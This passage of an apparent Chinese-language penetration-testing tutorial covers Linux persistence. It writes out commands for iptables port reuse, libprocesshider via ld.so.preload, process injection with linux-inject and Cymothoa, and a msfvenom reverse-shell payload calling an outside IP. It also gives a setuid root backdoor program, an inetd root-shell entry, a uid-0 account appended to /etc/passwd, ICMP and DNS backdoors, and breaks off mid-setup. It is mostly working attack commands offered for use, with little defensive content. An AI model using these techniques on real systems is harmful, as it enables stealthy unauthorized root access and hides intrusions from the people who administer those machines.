    # let's do it
    iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
exploit
TIPS：docker测试的时候
    docker run -ti --privileged ubuntu:latest
\--privileged这个参数一定要加上
    #开启复用
    echo threathuntercoming | socat - tcp:192.168.19.170:80
    #ssh使用80端口进行登录
    ssh -p 80 PI:EMAIL:
    #关闭复用
    echo threathunterleaving | socat - tcp:192.168.19.170:80
另外还有icmp的利用方式  
原文在  
远程遥控 IPTables 进行端口复用  
### 隐藏进程
#### libprocesshider
github上的一个项目，项目地址  
    利用 LD_PRELOAD 来实现系统函数的劫持，实现如下：
    # 下载程序编译
    git clone https://github.com/gianlucaborello/libprocesshider.git
    apt-get install  gcc automake autoconf libtool make
    cd libprocesshider/ && make
    # 移动文件到/usr/local/lib/目录下
    cp libprocesshider.so /usr/local/lib/
    # 把它加载到全局动态连接局
    echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload或者export LD_PRELOAD=/usr/local/lib/libprocesshider.so
运行  
效果  
具体的进程名字，自己可以在c文件里面设置
克制它的工具
    unhide  proc
#### linux-inject
linux-inject是用于将共享对象注入Linux进程的工具
项目地址： 
    # 下载程序编译
    git clone https://github.com/gaffe23/linux-inject.git
    cd linux-inject && make
    # 测试进程
    ./sample-target
    # 进程注入
    ./inject -n sample-target sample-library.so
先编译自己定义的c文件  
安装依赖包
    sudo apt-get purge libc6-dev
    sudo apt-get install libc6-dev
    sudo apt-get install libc6-dev-i386
    sudo apt-get install clang
    #include 
    __attribute__((constructor))void hello() {    puts("Hello world!");}
生成so文件
    gcc -shared -fPIC -o libwing.so hello.c
先执行测试的文件  
然后注入自定义的so文件  
注入成功。  
## Vegile
在linux下执行某个可执行文件之前，系统会预先加载用户定义的动态链接库的一种技术，这个技术可以重写系统的库函数，导致发生Hijack。
Vegile是一个用来隐藏自己的进程的工具，即使进程被杀，又会重新启动。
先生成一个msf后门
    msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=149.129.72.186  LPORT=8000  -f elf -o /var/www/html/Wing_Backdoor2
msf开启监听
执行  
第一种是进程注入的方式  
第二种是进程被杀还可以继续反弹shell
由于依赖的原因，第二种有点小bug  
测试成功。
## Cymothoa
Cymothoa是一个轻量级的后门，也是使用进程注入的方法。
下载地址：  
编译好的地址  
使用方法
    ./cymothoa -S
查看可用的shellcode  
只要反弹shell的功能，0即可
查找到bash的pid，因为bash进程一般都是存在的  
    ./cymothoa -p pid -s 1 -y port
不太可控，我在kali测试会把进程弄死掉，实际环境不建议使用。
然后我msf的窗口就卡死了  
成功的话nc可以直接连接自定义的端口，跟环境有关系。
## Setuid and Setgid
setuid: 设置使文件在执行阶段具有文件所有者的权限. 典型的文件是 /usr/bin/passwd. 如果一般用户执行该文件， 则在执行过程中，
该文件可以获得root权限， 从而可以更改用户的密码.
setgid: 该权限只对目录有效. 目录被设置该位后， 任何用户在此目录下创建的文件都具有和该目录所属的组相同的组.
sticky bit: 该位可以理解为防删除位. 一个文件是否可以被某用户删除， 主要取决于该文件所属的组是否对该用户具有写权限. 如果没有写权限，
则这个目录下的所有文件都不能被删除， 同时也不能添加新的文件. 如果希望用户能够添加文件但同时不能删除文件， 则可以对文件使用sticky bit位.
设置该位后， 就算用户对目录具有写权限， 也不能删除该文件.
众所周知，Linux的文件权限如:
777;666等，其实只要在相应的文件上加上UID的权限，就可以用到加权限人的身份去运行这个文件。所以我们只需要将bash复制出来到另一个地方，
然后用root加上UID权限，只要用户运行此Shell就可以用用root的身份来执行任何文件了。
写一个简单的后门：  
backdoor.c
    #include 
    void main(int argc, char *argv[])
    {
        setuid(0);
        setgid(0);
        if(argc > 1)
            execl("/bin/sh", "sh", "-c", argv[1], NULL);
        else
            execl("/bin/sh", "sh", NULL);
    }
编译：
    gcc backdoor.c -o backdoor
    cp backdoor /bin/
    chmod u+s /bin/backdoor
wing权限执行backdoor  
## inetd后门
inetd是监视一些网络请求的守护进程，其根据网络请求来调用相应的服务进程来处理连接请求。 它可以为多种服务管理连接，当inetd
接到连接时，它能够确定连接所需的程序，启动相应的进程，并把socket 交给它（服务socket 会作为程序的标准输入、 输出和错误输出描述符）。
安装
    apt-get install openbsd-inetd
用系统自带的服务  
配置后门
    # vi /etc/inetd.conf    
    fido  stream tcp nowait  root  /bin/bash bash -i # 当外部请求名为fido的服务时就弹shell
    inetd
nc连接  
参考：[基于 inetd 后门的简要分析及利用](https://klionsec.github.io/2017/10/23/inetd-backdoor/)
## 添加后门账户
    生成密码
    perl -e 'print crypt("wing", "AA"). "\n"'
    直接添加到passwd
    echo "weblogic1:AAyx65VrBb.fI:0:0:root:/root:/bin/bash">>/etc/passwd
容易被检测出来，还不如直接ssh key
## ICMP后门
项目地址：  
编译
Android平台：
    apt-get install gcc-arm-linux-gnueabi
    arm-linux-gnueabi-gcc -DSTATIC -DDETACH -DNORENAME -static -march=armv5 prism.c -o prism
Linux 64bit：
    apt-get install libc6-dev-amd64
    gcc -DDETACH -m64 -Wall -s -o prism prism.c
Linux 32bit：
    apt-get install libc6-dev-i386
    gcc -DDETACH -m32 -Wall -s -o prism prism.c
查看信息:
攻击机上等待后门连接
    nc -l -p 9999
发包触发后门  
## DNS后门
项目地址:
即使在最苛刻环境下，目标肯定也会允许DNS去解析外部或者内部的domain。  
这就可以作为一个C2通道。command和数据夹杂在DNS查询和响应头中，所以检测起来很困难，因为命令都隐藏在正常的流量里面。
我们使用[dnscat2](https://github.com/iagox86/dnscat2)来实现
我mac上安装有问题，烦得很，环境麻烦，kali了。  
算了，还是主机吧，困。。。  
server里面要换源，建议直接指定gemfile里面的源是
我的配置：
    # Gemfile
    # By Ron Bowes